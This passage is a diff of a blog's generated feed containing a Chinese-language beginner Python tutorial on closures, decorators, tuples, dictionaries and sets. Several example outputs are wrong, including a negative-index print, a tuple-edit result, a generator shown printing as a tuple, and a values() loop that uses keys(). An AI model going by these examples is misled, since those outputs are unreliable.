class="number">30</span>)</span><br><span class="line"><span class="comment"># 调用内部函数</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用闭包之前</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a</span>):</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    num = num + a</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">b = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (b &lt; <span class="number">5</span>):</span><br><span class="line">    fn(<span class="number">1</span>)</span><br><span class="line">    b += <span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="comment"># 当我们不希望num这个序列被更改时，可以添加一个函数（闭包），让作用域变成函数作用域</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>():</span></span><br><span class="line">    num = <span class="number">1</span>	<span class="comment"># 这里num只能通过fn1()来看到</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fn1</span>(<span class="params">a</span>):</span></span><br><span class="line">        <span class="keyword">nonlocal</span> num	<span class="comment"># 因为作用域，num不能直接被更改，使用nonlocal使上级作用域可以被更改</span></span><br><span class="line">        num = num + a	</span><br><span class="line">        <span class="built_in">print</span>(num)</span><br><span class="line">    <span class="keyword">return</span> fn1	<span class="comment">#让函数fn1作为返回值返回</span></span><br><span class="line">fn2 = fn()	<span class="comment"># 这里fn2的作用是调用fn()后返回的函数</span></span><br><span class="line">b = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (b &lt; <span class="number">5</span>):</span><br><span class="line">    fn2(<span class="number">1</span>)</span><br><span class="line">    b += <span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="comment"># 使用闭包后,局部变量num的值就会保存下来,而不是每次调用函数后销</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>():</span></span><br><span class="line">    num = []	<span class="comment"># 如果num是列表，可以使用列表方法来更改，不需要nonlocal</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fn1</span>(<span class="params">a</span>):</span></span><br><span class="line">        num.append(a)</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">return</span> fn1</span><br><span class="line">fn2 = fn()</span><br><span class="line"><span class="built_in">print</span>(fn2(<span class="number">10</span>))</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+<h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><p>​        元组（tuple）是Python中另一个重要的序列结构，与列表类似，也是由一系列按特定顺序排列的元素组成。但是它是不可变序列。因此，元组也可以称为不可变的列表。</p>
+<p>元组不能重新赋值</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象名 = (元素<span class="number">1</span>,元素<span class="number">2.</span>.....)	</span><br><span class="line">当不是空元组时，括号可以省略，但必须有逗号，比如：对象名 = 元素<span class="number">1</span>,</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h2><p>在不修改原函数的情况下，对原函数进行修改</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn_1</span>(<span class="params">old</span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">fn_2</span>():</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;---&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">		result = old()	<span class="comment"># 调用传入的参数</span></span><br><span class="line">        <span class="comment"># 这里使用变量保存，如果直接return会直接结束函数，后面的语句就不能执行</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;---&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">		<span class="keyword">return</span> result</span><br><span class="line">	<span class="keyword">return</span> fn_2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@fn_1	</span><span class="comment"># 把函数fn3传入fn_1，利用fn_1装饰fn3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn3</span>():</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;大家好&#x27;</span>)</span><br><span class="line">fn3()</span><br><span class="line">--------------------</span><br><span class="line">大家好</span><br><span class="line">--------------------</span><br></pre></td></tr></table></figure>
+<h3 id="解包（解构）"><a href="#解包（解构）" class="headerlink" title="解包（解构）"></a>解包（解构）</h3><p>解包指就是将元组当中每一个元素都赋值给一个变量<br>在对一个元组进行解包时，变量的数量必须和元组中的元素的数量一致<br>也可以在变量前边添加一个<code>*</code>，这样变量将会获取元组中所有剩余的元素<br>不能同时出现两个或以上的<code>*</code>变量</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a,b,c = 对象名</span><br><span class="line">a,b,*c = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="索引-1"><a href="#索引-1" class="headerlink" title="索引"></a>索引</h3><p>序列中的每个元素都有一个编号，也称为索引（Indexing）。这个索引是从0开始递增的，即下标为0表示第一个元素，下标为1表示第二个元素，依此类推。</p>
+<p>Python的索引可以是负数。这个索引从右向左计数，也就是从最后的一个元素开始计数，即最后一个元素的索引值是−1，倒数第二个元素的索引值为−2，依此类推。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">0</span>])</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(-<span class="number">2</span>)</span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="修改元组"><a href="#修改元组" class="headerlink" title="修改元组"></a>修改元组</h3><p>把元组转换为列表</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">y = <span class="built_in">list</span>(x)</span><br><span class="line">y[<span class="number">0</span>] = <span class="string">&quot;hello&quot;</span></span><br><span class="line">x = <span class="built_in">tuple</span>(y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line">(<span class="string">&quot;yello&quot;</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="遍历元组"><a href="#遍历元组" class="headerlink" title="遍历元组"></a>遍历元组</h3><p>通过for循环遍历列表</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="keyword">for</span> 变量 <span class="keyword">in</span> 序列 :</span><br><span class="line">	代码块</span><br><span class="line"></span><br><span class="line">a = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">通过<span class="keyword">for</span>循环和<span class="built_in">enumerate</span>()函数遍历元组和索引</span><br><span class="line"><span class="keyword">for</span> 变量<span class="number">1</span>,变量<span class="number">2</span> <span class="keyword">in</span> <span class="built_in">enumerate</span>(序列名字):</span><br><span class="line">	代码块</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">for</span> i,x <span class="keyword">in</span> <span class="built_in">enumerate</span>(a):</span><br><span class="line">	<span class="built_in">print</span>(i,x)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="元组推导式"><a href="#元组推导式" class="headerlink" title="元组推导式"></a>元组推导式</h3><p>和列表推导式一样，只是把<code>[]</code>变成<code>()</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name &#x3D; (表达式 for 变量 in 序列)</span><br><span class="line">import random</span><br><span class="line">a &#x3D; (random.randint(1,100) for i in range(10))</span><br><span class="line">从1-100里面随机生成10个数字</span><br><span class="line"></span><br><span class="line">name &#x3D; (表达式 for 变量 in 序列 条件语句)</span><br><span class="line">a &#x3D; (1,2,3,4,5,6)</span><br><span class="line">b &#x3D; (i+1 for i in a if i&gt;0)</span><br><span class="line">print(b)</span><br><span class="line">(2,3,4,5,6,7)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象.方法(条件)</span><br><span class="line"></span><br><span class="line"><span class="built_in">tuple</span>(x)</span><br><span class="line">创建元组,把x的内容转换为元组,x多为表达式</span><br><span class="line"><span class="built_in">tuple</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> 变量</span><br><span class="line">对于已经创建的元组，不在使用时，可以使用<span class="keyword">del</span>删除</span><br><span class="line"></span><br><span class="line"><span class="built_in">len</span>(x)</span><br><span class="line">通过<span class="built_in">len</span>()函数确定元组的长度</span><br><span class="line"></span><br><span class="line">对象名.index(x)</span><br><span class="line">在元组中搜索x的值并返回它的索引位置</span><br><span class="line"></span><br><span class="line">对象名.count(x)</span><br><span class="line">返回元组中指定值x出现的次数</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="列表和元组的区别"><a href="#列表和元组的区别" class="headerlink" title="列表和元组的区别"></a>列表和元组的区别</h3><ul>
+<li>列表属于可变序列，元素可以修改；元组属于不可变序列，元素不可以修改，除非整体替换。</li>
+<li>列表可以使用很多方法添加和修改元素，而元组没有</li>
+<li>列表可以使用切片访问和修改元素，而元组只可以通过切片访问元素</li>
+<li>元组比列表的访问速度要快，如果不对元素进行修改的时候，建议使用元组</li>
+<li>列表不能作为字典的键，而元组可以</li>
+</ul>
+<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>​        字典（dictionary）和列表类似，也是可变序列，不过与列表不同，它是无序的可变序列，保存的内容是以“键-值对”的形式存放的。</p>
+<p>字典属于一种新的数据结构，称为映射（mapping）</p>
+<p>字典，我们也称为叫做键值对（key-value）结构</p>
+<p>每个字典中都可以有多个键值对，而每一个键值对我们称其为一项（item）</p>
+<p>字典的key不能重复</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	变量 = &#123;key:value,key:value,key:value.......&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="创建字典"><a href="#创建字典" class="headerlink" title="创建字典"></a>创建字典</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line">这里不论是key还是value，只要是字符串，要加引号</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">dict</span>(a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>)</span><br><span class="line">通过<span class="built_in">dict</span>函数创建字典，这里字符串不需要加引号</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">dict</span>([(<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>),(<span class="string">&#x27;b&#x27;</span>,<span class="number">2</span>),(<span class="string">&#x27;c&#x27;</span>,<span class="number">3</span>)])</span><br><span class="line">双值序列创建字典</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="获取字典的值"><a href="#获取字典的值" class="headerlink" title="获取字典的值"></a>获取字典的值</h3><p>通过key获取字典的值</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">dict</span>(a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>)</span><br><span class="line">a[<span class="string">&#x27;a&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">dict</span>(a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">通过遍历 keys()来获取所有的键</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 对象名.keys():</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a.keys():</span><br><span class="line">	<span class="built_in">print</span>(i,a[i])</span><br><span class="line">a <span class="number">1</span></span><br><span class="line">b <span class="number">2</span></span><br><span class="line">c <span class="number">3</span></span><br><span class="line"></span><br><span class="line">通过遍历 values()返回字典的值</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 对象名.keys():</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    </span><br><span class="line">通过遍历 items()该方法会返回字典中所有的项</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 对象名.items():</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">(<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">&#x27;b&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> 对象名.items():</span><br><span class="line">	<span class="built_in">print</span>(k , <span class="string">&#x27;=&#x27;</span> , v)</span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象.方法(条件)</span><br><span class="line"></span><br><span class="line">对象名.get(key，默认值) 该方法用来根据键来获取字典中的值，获取不到会返回默认值</span><br><span class="line"><span class="built_in">print</span>(对象名.get(key))</span><br><span class="line"></span><br><span class="line">修改字典，如果key存在则覆盖，不存在则添加</span><br><span class="line">对象名[key] = value</span><br><span class="line"></span><br><span class="line">setdefault(key[, default]) 可以用来向字典中添加key-value</span><br><span class="line">  如果key已经存在于字典中，则返回key的值，不会对字典做任何操作</span><br><span class="line">  如果key不存在，则向字典中添加这个key，并设置value</span><br><span class="line">对象名.setdefault(key,value)</span><br><span class="line"></span><br><span class="line">update([other])</span><br><span class="line">将其他的字典中的key-value添加到当前字典中</span><br><span class="line">如果有重复的key，则后边的会替换到当前的</span><br><span class="line">d = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line">d2 = &#123;<span class="string">&#x27;d&#x27;</span>:<span class="number">4</span>,<span class="string">&#x27;e&#x27;</span>:<span class="number">5</span>,<span class="string">&#x27;f&#x27;</span>:<span class="number">6</span>, <span class="string">&#x27;a&#x27;</span>:<span class="number">7</span>&#125;</span><br><span class="line">d.update(d2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> 用来删除key-value</span><br><span class="line"><span class="keyword">del</span> 对象名[key]</span><br><span class="line"></span><br><span class="line">popitem()随机删除字典中的一个键值对，一般都会删除最后一个键值对，并返回删除的键值对</span><br><span class="line">变量 = 对象名.popitem()</span><br><span class="line"></span><br><span class="line">pop()根据key删除key-value并返回，指定默认值若不存在Key则返回默认值</span><br><span class="line">变量 = 对象名.pop(key,默认值)</span><br><span class="line"></span><br><span class="line">clear()用来清空字典</span><br><span class="line">对象名.clear()</span><br><span class="line"></span><br><span class="line">copy()方法:复制</span><br><span class="line">变量 = 对象名.copy()</span><br><span class="line"></span><br><span class="line">fromkeys()	返回拥有指定键和值的字典</span><br><span class="line">x = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">y = <span class="number">1</span></span><br><span class="line">z = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">a = <span class="built_in">dict</span>.fromkeys(x,y)</span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">1</span>&#125;</span><br><span class="line">b = <span class="built_in">dict</span>.fromkeys(x,z)</span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>:(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),<span class="string">&#x27;b&#x27;</span>:(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),<span class="string">&#x27;c&#x27;</span>:(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)&#125;</span><br><span class="line"></span><br><span class="line">a.fromkeys(a)</span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;b&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;c&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">a.fromkeys(x,y)</span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>​        Python中的集合（set）与数学中的集合概念类似，也是用于保存不重复的元素。它有可变集合（set）和不可变集合（frozenset）两种。</p>
+<p>​        在形式上，集合的所有元素都放在一对大括号“{}”中，两个相邻元素间使用逗号“,”分隔。集合最好的应用就是去重，因为集合中的每个元素都是唯一的。</p>
+<p>集合和序列非常相似：</p>
+<p>不同点：</p>
+<p>1.集合中只能存储不可变对象<br>2.集合中存储的对象是无序（不是按照元素的插入顺序保存）<br>3.集合中不能出现重复的元素</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	变量 = &#123;元素<span class="number">1</span>,元素<span class="number">2.</span>.....&#125;</span><br><span class="line">	</span><br><span class="line">可以通过<span class="built_in">set</span>()来将序列和字典转换为集合</span><br><span class="line">变量 = <span class="built_in">set</span>([元素<span class="number">1</span>,元素<span class="number">2.</span>.....])</span><br><span class="line">变量 = <span class="built_in">set</span>(&#123;key:value,key:value.......&#125;)</span><br><span class="line">使用<span class="built_in">set</span>()将字典转换为集合时，只会包含字典中的键</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象.方法(条件)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add() 向集合中添加元素</span></span><br><span class="line">对象名.add(元素)</span><br><span class="line"></span><br><span class="line"><span class="comment"># update() 将一个集合中的元素添加到当前集合中</span></span><br><span class="line"><span class="comment"># update()可以传递序列或字典作为参数，字典只会使用键</span></span><br><span class="line">s2 = <span class="built_in">set</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">对象<span class="number">1.</span>update(对象<span class="number">2</span>)</span><br><span class="line">对象名.update([元素<span class="number">1</span>，元素<span class="number">2.</span>.....])</span><br><span class="line">对象名.update(&#123;key:value,key:value.......&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop()随机删除并返回一个集合中的元素</span></span><br><span class="line">变量 = 对象名.pop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove()删除集合中的指定元素</span></span><br><span class="line">对象名.remove(元素)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear()清空集合</span></span><br><span class="line">对象名.clear()</span><br><span class="line"></span><br><span class="line"><span class="comment"># copy()对集合进行浅复制</span></span><br><span class="line">变量 = 对象名.copy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在对集合做运算时，不会影响原来的集合，而是返回一个运算结果</span></span><br><span class="line"><span class="comment"># 创建两个集合</span></span><br><span class="line">s = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">s2 = &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp; 交集运算</span></span><br><span class="line">result = s &amp; s2 <span class="comment"># &#123;3, 4, 5&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># | 并集运算</span></span><br><span class="line">result = s | s2 <span class="comment"># &#123;1,2,3,4,5,6,7&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># - 差集</span></span><br><span class="line">result = s - s2 <span class="comment"># &#123;1, 2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ^ 异或集 获取只在一个集合中出现的元素</span></span><br><span class="line">result = s ^ s2 <span class="comment"># &#123;1, 2, 6, 7&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;= 检查一个集合是否是另一个集合的子集</span></span><br><span class="line"><span class="comment"># 如果a集合中的元素全部都在b集合中出现，那么a集合就是b集合的子集，b集合是a集合超集</span></span><br><span class="line">a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">b = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line">result = a &lt;= b <span class="comment"># True</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt;= &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># True</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125; &lt;= &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt; 检查一个集合是否是另一个集合的真子集</span></span><br><span class="line"><span class="comment"># 如果超集b中含有子集a中所有元素，并且b中还有a中没有的元素，则b就是a的真超集，a是b的真子集</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt; &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># False</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt; &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125; <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line">difference()	返回包含两个或更多集合之间差异的集合。</span><br><span class="line">difference_update()	删除此集合中也包含在另一个指定集合中的项目。</span><br><span class="line">discard()	删除指定项目。</span><br><span class="line">intersection()	返回为两个其他集合的交集的集合。</span><br><span class="line">intersection_update()	删除此集合中不存在于其他指定集合中的项目。</span><br><span class="line">isdisjoint()	返回两个集合是否有交集。</span><br><span class="line">issubset()	返回另一个集合是否包含此集合。</span><br><span class="line">issuperset()	返回此集合是否包含另一个集合。</span><br><span class="line">symmetric_difference()	返回具有两组集合的对称差集的集合。</span><br><span class="line">symmetric_difference_update()	插入此集合和另一个集合的对称差集。</span><br><span class="line">union()	返回包含集合并集的集合。</span><br><span class="line">update()	用此集合和其他集合的并集来更新集合。</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -1174,141 +1380,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Python3-数组</title>
-    <url>//ecee3d177b80.html</url>
-    <content><![CDATA[<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ul>
-<li>列表(list): 是序列中的可变序列</li>
-<li>元组(tuple): 是序列中的不可变序列</li>
-<li>字典(dict): 新的数据结构，称为映射（mapping）</li>
-<li>集合(set): 是一个无序和无索引的集合。没有重复的成员</li>
-</ul>
-<h2 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h2><p>​    序列是一块用于存放多个值的连续内存空间，并且按一定顺序排列，每个值（称为元素）都分配一个数字，称为索引或位置。通过该索引可以取出相应的值。</p>
-<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>Python中的列表是由一系列按特定顺序排列的元素组成。它是Python中内置的可变序列。</p>
-<p>在形式上，列表的所有元素都放在一对中括号“[]”中，两个相邻元素间使用逗号“,”分隔。</p>
-<p>在内容上，可以将整数、实数、字符串、列表、元组等任何类型的内容放入列表中，并且同一个列表中，元素的类型可以不同，因为它们之间没有任何关系。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	列表名字 = [a,b,c]</span><br><span class="line">a,b,c是元素，可以是任意的数值类型</span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">type</span>(a) = <span class="built_in">list</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><p>序列中的每个元素都有一个编号，也称为索引（Indexing）。这个索引是从0开始递增的，即下标为0表示第一个元素，下标为1表示第二个元素，依此类推。</p>
-<p>Python的索引可以是负数。这个索引从右向左计数，也就是从最后的一个元素开始计数，即最后一个元素的索引值是−1，倒数第二个元素的索引值为−2，依此类推。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">2</span>])</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(a[-<span class="number">1</span>])</span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><p>获取多个索引称为切片</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	列表名字[起始索引:结束索引:步长]</span><br><span class="line">步长默认为<span class="number">1</span>，起始位置(包括)和结束位置(不包括)也可省略不写</span><br><span class="line">三者都写成负数，则从列表的后向前取a[-<span class="number">1</span>:-<span class="built_in">len</span>(a)-<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line">[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">1</span>:<span class="number">5</span>:<span class="number">2</span>])</span><br><span class="line">[<span class="number">2</span>,<span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(a[:])</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="修改列表"><a href="#修改列表" class="headerlink" title="修改列表"></a>修改列表</h3><p>可以用切片修改列表</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">对象名[起始索引:结束索引:步长] = [元素<span class="number">1</span>,元素<span class="number">2.</span>.....]</span><br><span class="line">a[<span class="built_in">len</span>(a):]=[<span class="number">11</span>]	结尾增加</span><br><span class="line">a[<span class="number">0</span>:<span class="number">0</span>]=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] 固定位置或者开头增加</span><br><span class="line">a[<span class="number">0</span>:<span class="number">3</span>] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] 修改前三个</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="遍历列表"><a href="#遍历列表" class="headerlink" title="遍历列表"></a>遍历列表</h3><p>通过for循环遍历列表</p>
